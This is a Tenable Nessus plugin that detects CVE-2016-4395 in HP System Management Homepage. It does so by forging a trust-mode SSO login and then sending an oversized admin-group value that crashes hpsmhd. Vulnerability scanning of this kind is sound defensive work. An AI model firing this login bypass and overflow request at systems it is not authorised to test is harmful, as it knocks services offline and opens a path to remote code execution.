#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(94673);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/11/18 20:40:53 $");

  script_cve_id("CVE-2016-4395");
  script_bugtraq_id(93961);
  script_osvdb_id(146382);
  script_xref(name:"HP", value:"HPSBMU03653");
  script_xref(name:"IAVB", value:"2016-B-0160");
  script_xref(name:"HP", value:"emr_na-c05320149");
  script_xref(name:"TRA", value:"TRA-2016-32");
  script_xref(name:"ZDI", value:"ZDI-16-587");

  script_name(english:"HP System Management Homepage SetSMHData admin-group Parameter Handling RCE");
  script_summary(english:"Attempts to terminate hpsmhd.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:"
The HP System Management Homepage (SMH) running on the remote host is
affected by a remote code execution vulnerability due to an overflow
condition in the mod_smh_config.so library caused by improper
validation of user-supplied input when parsing the admin-group
parameter supplied to the /proxy/SetSMHData endpoint. An
unauthenticated, remote attacker can exploit this, via a specially
crafted request, to cause a denial of service condition or the
execution of arbitrary code. 

Note that HP SMH is reportedly affected by additional vulnerabilities; however,
this plugin has not tested for them.");
  # https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05320149
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?57f92332");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2016-32");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-16-587/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to HP System Management Homepage (SMH) version 7.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/10/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/10/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/11/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:system_management_homepage");
  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("compaq_wbem_detect.nasl");
  script_require_keys("www/hp_smh", "Settings/ParanoidReport");
  script_require_ports("Services/www", 2301, 2381);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

# Use lack of response to flag vulnerability is not so reliable
if (report_paranoia < 2) audit(AUDIT_PARANOID);

# Plugin will exit if SMH is not detected on the host
appname = 'hp_smh';
get_install_count(app_name:appname, exit_if_zero:TRUE);

port = get_http_port(default:2381, embedded:TRUE);

# Get SMH info from KB
# Plugin will exit if SMH is not detected on this port 
install = get_install_from_kb(appname:appname, port:port, exit_on_fail:TRUE);
prod  = get_kb_item_or_exit("www/"+port+"/hp_smh/variant");

# Attack vector is through https, so skip non-SSL ports
if (get_port_transport(port) == ENCAPS_IP)
  exit(0, "Service listening on port " + port + " does not speak SSL.");

# Use session cookie in subsequent requests
init_cookiejar();

tkn = crap(data:'A', length:16); # ?
key = string(unixtime() - 150);    # ?
ha  = 'SHA-1'; #  
xe  = 'XECert'; # servename checked by TrustedByName';
un  = 'nessus'; # user name 
ua  = '4';      # user access level, 4 = highest
# URL to redirect to after a successful 'login'
redirect = 'https://' + get_host_ip() + ':' + port + '/';
url = '/proxy/sso?' +
      'TKN=' + tkn +
      '&' + 'KEY=' + key +
      '&' + 'XE=' + xe +
      '&' + 'UN=' + un +
      '&' + 'UA=' + ua +
      '&' + 'URL=' + redirect;
res = http_send_recv3(
        port:port, 
        item: url, 
        method: 'GET', 
        exit_on_fail:TRUE);

if (res[0] =~ "^HTTP/[0-9]\.[0-9] 403")
{
  exit(0, 'The service listening on port ' + port + ' is configured with IP restricted logins, and Nessus is not allowed to access it.');
}

# Nessus can only POST data to /proxy/SetSMHData if TrustedByAll is configured.
# With TrustedByAll, Nessus can 'login' to SMH without credentials.
# When the 'login' succeeds, the url specified in the URL param in the
# query string is put into the Location header in the response along
# with a 302 response status code. 
if(res[0] !~ "^HTTP/[0-9]\.[0-9] 302" || !egrep(string:res[1],pattern:'Location: ' + redirect))
  exit(0, 'The service listening on port ' + port + ' is not configured with the TrustedByAll trust mode. Nessus cannot continue.'); 

req1 = http_last_sent_request();

# overflow 0x500-byte stack buffer
data = 'admin-group=' + crap(data:'A', length:0x1000) + '&';
res = http_send_recv3(
        port        : port, 
        item        : '/proxy/SetSMHData',
        method      : 'POST',
        data        : data, 
        content_type: 'application/x-www-form-urlencoded'
        ); 

req2 = http_last_sent_request();
if(res)
{
  if(res[0] =~ "^HTTP/[0-9]\.[0-9] 302")
  { 
    matches = eregmatch(string: res[1], pattern:'(Location: .*)');
    if(matches)
    {
      loc = matches[1];
      if("message.php?204&4" >< loc)
      {
        audit(AUDIT_HOST_NOT, 'affected');
      }
      else if ("/proxy/kerberos" >< tolower(loc))
      {
        exit(0, 'The SMH installation on the remote host is configured with Kerberos authorization. Nessus cannot determine whether the remote host is vulnerable.'); 
      }
      else
      {
        audit(AUDIT_RESP_BAD, port, 'a POST request. Unexpected Location header in response : ' + loc);
      }
    }
    else
    {
      audit(AUDIT_RESP_BAD, port, 'a POST request. No Location header in response');
    }
  }
  else
  {
    audit(AUDIT_RESP_BAD, port, 'a POST request. Unexpected HTTP response status : \n' + res[0]);
  }
}
# hpsmhd terminates and restarts 
else
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    request    : make_list(req1, req2),
    generic    : TRUE
  );
}
